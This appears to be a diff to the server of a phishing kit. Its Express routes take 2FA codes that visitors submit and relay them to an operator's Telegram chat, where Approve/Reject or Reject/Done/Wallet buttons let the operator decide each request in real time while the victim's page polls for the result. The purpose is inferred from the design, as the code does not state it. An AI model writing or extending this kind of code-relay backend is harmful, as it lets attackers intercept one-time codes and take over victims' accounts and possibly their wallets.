@@ -193,7 +193,7 @@ app.post("/send-verify", async (req, res) => {
 });
 
 // -----------------
-// ✅ UPDATED: 2FA submit — now uses send2FATelegram (Reject / Done / Wallet)
+// 2FA: Submit code — original (Approve / Reject) — UNCHANGED
 // -----------------
 app.post("/api/submit-2fa", async (req, res) => {
   const { message, requestId } = req.body;
@@ -206,7 +206,22 @@ app.post("/api/submit-2fa", async (req, res) => {
   console.log(`📥 2FA Request received: ${requestId}`);
 
   try {
-    await send2FATelegram(message, requestId);
+    const { bot } = require("./bot");
+    await bot.sendMessage(
+      process.env.ADMIN_CHAT_ID || process.env.CHAT_ID,
+      message,
+      {
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: "✅ Approve", callback_data: `2fa_approve|${requestId}` },
+              { text: "❌ Reject",  callback_data: `2fa_reject|${requestId}` }
+            ]
+          ]
+        }
+      }
+    );
     res.json({ status: "pending", requestId });
   } catch (err) {
     console.error("❌ Failed to send 2FA Telegram message:", err);
@@ -215,7 +230,29 @@ app.post("/api/submit-2fa", async (req, res) => {
 });
 
 // -----------------
-// 2FA: Poll approval status
+// ✅ NEW: 2FA submit — new page (Reject / Done / Wallet)
+// -----------------
+app.post("/api/submit-2fa-new", async (req, res) => {
+  const { message, requestId } = req.body;
+
+  if (!message || !requestId) {
+    return res.status(400).json({ error: "Missing message or requestId" });
+  }
+
+  pending2FA[requestId] = { status: "pending", message };
+  console.log(`📥 2FA-New Request received: ${requestId}`);
+
+  try {
+    await send2FATelegram(message, requestId);
+    res.json({ status: "pending", requestId });
+  } catch (err) {
+    console.error("❌ Failed to send 2FA-New Telegram message:", err);
+    res.status(500).json({ error: "Failed to send Telegram message" });
+  }
+});
+
+// -----------------
+// 2FA: Poll approval status (shared by both 2FA endpoints)
 // -----------------
 app.get("/api/approval-status/:requestId", (req, res) => {
   const { requestId } = req.params;
@@ -226,7 +263,7 @@ app.get("/api/approval-status/:requestId", (req, res) => {
 });
 
 // -----------------
-// 2FA: Update approval from bot callback
+// 2FA: Update approval from bot callback (shared by both 2FA endpoints)
 // -----------------
 app.post("/api/update-2fa-status", (req, res) => {
   const { requestId, status } = req.body;
